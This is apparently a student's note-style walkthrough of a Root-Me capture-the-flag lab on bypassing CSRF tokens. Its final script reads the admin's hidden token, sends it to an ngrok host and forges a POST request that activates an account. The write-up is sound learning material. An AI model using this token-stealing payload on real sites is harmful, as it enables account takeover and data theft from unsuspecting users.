# Lab 2 CSRF - token bypass

- Activate your account to access intranet.
![[Pasted image 20251118112744.png]]
- Notice there is a hidden token 

- Its the same lab but with token so first of all we need to retrive admin token then submit the form to active our account 

## Testing Connectivity

![[Pasted image 20251118113644.png]]

![[Pasted image 20251118113629.png]]
- perfect now lets simulate the get request and see how the token is shown

## Testing Get Request

```
  var url = "http://challenge01.root-me.org/web-client/ch23/?action=profile";
    var loadProfile = new XMLHttpRequest();
    loadProfile.open("GET", url, false);
    loadProfile.send();
```

![[Pasted image 20251118114147.png]]
- Asking Ai For regex
```
	var regex = /name="token"\s+value="([a-f0-9]{32})"/i;
    var match = regex.exec(loadProfile.responseText);
```
![[Pasted image 20251118114417.png]]

## Generate Poc 
```
<script>
    var url = "http://challenge01.root-me.org/web-client/ch23/?action=profile";
    var loadProfile = new XMLHttpRequest();
    loadProfile.open("GET", url, false);
    loadProfile.send();
    var regex = /name="token"\s+value="([a-f0-9]{32})"/i;
    var match = regex.exec(loadProfile.responseText);

    if (match) {
        var token = match[1];

        new Image().src = "https://3cc3c07b44c0.ngrok-free.app/log?token=" + token;

        var post = new XMLHttpRequest();
        post.open("POST", url, true);
        post.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        post.send("username=test1&status=on&token=" + token);
    } else {
        new Image().src = "https://3cc3c07b44c0.ngrok-free.app/log?err=no_token"
    }
</script>
```
![[Pasted image 20251118120513.png]]![[Pasted image 20251118120724.png]]

![[Pasted image 20251118120736.png]]